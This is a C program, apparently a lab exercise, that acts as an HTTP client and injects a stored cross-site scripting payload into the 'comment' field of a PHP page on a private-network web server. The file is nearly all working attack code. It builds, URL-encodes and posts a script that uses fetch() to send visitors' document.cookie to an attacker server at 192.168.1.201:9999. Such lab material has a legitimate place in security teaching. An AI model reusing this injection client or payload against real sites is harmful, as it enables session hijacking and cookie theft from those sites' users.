/*
 * ex3_db_insert_stored.c
 * 
 * Stored XSS Attack Demonstration - Payload Injection Client
 * 
 * This program acts as an HTTP client that sends a POST request to
 * task2stored.php to inject a malicious JavaScript payload into the
 * database. The payload will steal session cookies and send them to
 * the attacker's server at 192.168.1.201:9999.
 * 
 * Compilation: gcc -Wall -Wextra -Werror -Wconversion ex3_db_insert_stored.c -o ex3_db_insert_stored
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// web server IP
#define WEB_IP "192.168.1.203"
// web server port
#define TARGET_PORT 80
// PHP fir HTTPS request
#define TARGET_PATH "/task2stored.php"
// attacker ip + port
#define ATTACKER_SERVER "192.168.1.201:9999"
// maximum size for reading the web server response
#define BUFFER_SIZE 4096
// return value for failure
#define FAILURE 0
// return value for success
#define SUCCESS 1

/*
 * url_encode - URL encodes a string
 * @dest: Destination buffer for encoded string
 * @dest_size: Size of destination buffer
 * @src: Source string to encode
 *
 * Returns: 0 on success, -1 on error
 */
static int url_encode(char *dest, size_t dest_size, const char *src) {
    // init write position in destination buffer
    size_t dest_pos = 0;
    // iterate over each character in the source string
    while (*src != '\0' && dest_pos < dest_size - 4) {
         // check if character is URL-safe:
         // RFC 3986 unreserved characters
        if ((*src >= 'a' && *src <= 'z') ||
            (*src >= 'A' && *src <= 'Z') ||
            (*src >= '0' && *src <= '9') ||
            *src == '-' || *src == '_' || *src == '.' || *src == '~') {
            // copy safe character directly
            dest[dest_pos++] = *src;
        } else {
            //Encode unsafe character as %HH
            // where HH is the hexadecimal value
            int written = snprintf(&dest[dest_pos], dest_size - dest_pos,
                                  "%%%02X", (unsigned char)*src);
            // validate snprintf result
            if (written < 0 || dest_pos + (size_t)written >= dest_size) {
                return FAILURE;
            }
            // advance dest pointer
            dest_pos += (size_t)written;
        }
        // advance src pointer
        src++;
    }
   // ensure dest buffer was large enough
    if (dest_pos >= dest_size) {
        return FAILURE;
    }
    // null terminate
    dest[dest_pos] = '\0';

    return SUCCESS;
}

/*
 * main
 *
 * Program entry point.
 *
 * Execution flow:
 * 1. Construct malicious JavaScript payload
 * 2. URL-encode payload for safe POST transmission
 * 3. Build HTTP POST request
 * 4. Connect to target web server
 * 5. Send POST request containing stored XSS payload
 * 6. Read server response and terminate
 *
 * Returns:
 *   0 on normal termination
 *   Exits with failure code on error
 */

int main(void) {
    // init socket
    int sock_fd;
    // init address struct
    struct sockaddr_in server_addr;
    // buffers for payload construction
    char xss_payload[512];
    char encoded_payload[2048];
    char post_data[4096];
    char http_request[8192];
    // buffer for reading HTTP response
    char response_buffer[BUFFER_SIZE];
    // init len vars
    ssize_t bytes_sent;
    ssize_t bytes_received;
    // construct raw JavaScript payload.
    // payload steals cookies and sends them to attacker server.
    snprintf(xss_payload, sizeof(xss_payload),
             "<script>fetch('http://%s/?cookie='+document.cookie)</script>",
             ATTACKER_SERVER);
    // URL-encode payload so it can be safely included
    // in application/x-www-form-urlencoded POST data
    if (url_encode(encoded_payload, sizeof(encoded_payload), xss_payload) !=
    SUCCESS) {
        exit(EXIT_FAILURE);
    }
    // the vulnerable application stores the 'comment' parameter.
    snprintf(post_data, sizeof(post_data),
             "comment=%s", encoded_payload);
    // calculate Content-Length header value
    size_t content_length = strlen(post_data);
    // construct full HTTP POST request.
    snprintf(http_request, sizeof(http_request),
             "POST /task2stored.php HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: %lu\r\n"
             "Connection: close\r\n"
             "\r\n"
             "%s",
             WEB_IP, content_length, post_data);
    // open sock
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        exit(EXIT_FAILURE);
    }
    // init server address struct
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    // convert to binary form
    if (inet_pton(AF_INET, WEB_IP, &server_addr.sin_addr) <= 0) {
        close(sock_fd);
        exit(EXIT_FAILURE);
    }
    // connect with web server
    if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock_fd);
        exit(EXIT_FAILURE);
    }
    // send crafted HTTP request
    bytes_sent = write(sock_fd, http_request, strlen(http_request));
    if (bytes_sent < 0) {
        close(sock_fd);
        exit(EXIT_FAILURE);
    }
    // read HTTP response (not parsed, only consumed).
    memset(response_buffer, 0, BUFFER_SIZE);
    bytes_received = read(sock_fd, response_buffer, BUFFER_SIZE - 1);
    if (bytes_received < 0) {
        close(sock_fd);
        exit(EXIT_FAILURE);
    }
    // close socket and terminate
    close(sock_fd);

    exit(EXIT_SUCCESS);
}
